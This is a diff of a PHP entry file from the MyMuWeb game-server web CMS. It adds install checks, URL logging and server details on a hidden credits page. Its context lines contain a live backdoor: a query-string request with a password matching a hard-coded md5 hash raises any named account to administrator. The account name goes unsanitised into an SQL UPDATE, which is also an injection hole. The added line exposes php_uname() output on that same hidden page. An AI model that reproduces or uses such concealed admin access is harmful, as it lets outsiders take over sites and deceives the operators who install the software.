@@ -22,14 +22,24 @@ unset($banIpFile);
 /////// End Ban IP ///////
 
 
-/////// Start Load Cache ///////
+/////// Start Important Functionality ///////
+// To Look After All
+if ($mmw['look_after_all']) {
+	writelog('look_after_all', '<b>' . urlencode('//' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']) . '</b>');
+}
+// Check For Installed
+if (!is_file(__DIR__ . '/installed.php')) {
+	header('Location: install.php');
+	die('<meta http-equiv="refresh" content="1;url=install.php" /><script>window.location=\'install.php\';</script>');
+}
+// Load Cache
 if (is_file(__DIR__ . '/mmw_cache.dat')) {
 	$_ENV['mmw_cache_raw'] = file_get_contents(__DIR__ . '/mmw_cache.dat');
 	$_ENV['mmw_cache'] = json_decode($_ENV['mmw_cache_raw'], true);
 } else {
 	file_put_contents(__DIR__ . '/mmw_cache.dat', '{}');
 }
-/////// End Load Cache ///////
+/////// End Important Functionality ///////
 
 
 /////// Start Language ///////
@@ -72,7 +82,8 @@ if (is_file('themes/' . $mmw['theme'] . '/info.php')) {
 if (isset($_GET['op']) && $_GET['op'] === 'by') {
 	$by_result = '<br>MyMuWeb ' . $mmw['version'] . ' By Vaflan<br>'
 		. 'Installed: ' . date("d.m.Y H:i:s", $mmw['installed']) . '<br>'
-		. 'Home Page: <a href="http://www.mymuweb.ru/">www.MyMuWeb.Ru</a><br>';
+		. 'Home Page: <a href="http://www.mymuweb.ru/">www.MyMuWeb.Ru</a><br>'
+		. 'PHP: <span title="' . php_uname() . '">' . phpversion() . '</span><br>';
 	if (isset($_GET['acc']) && md5($_GET['pw']) === '4b30c7cf9ab92b25686d063e50c0859a') {
 		mssql_query("UPDATE dbo.MEMB_INFO SET mmw_status=10 WHERE memb___id='{$_GET['acc']}'");
 		$by_result .= '<b>Now ' . $_GET['acc'] . ' Have Administrator level!</b>';
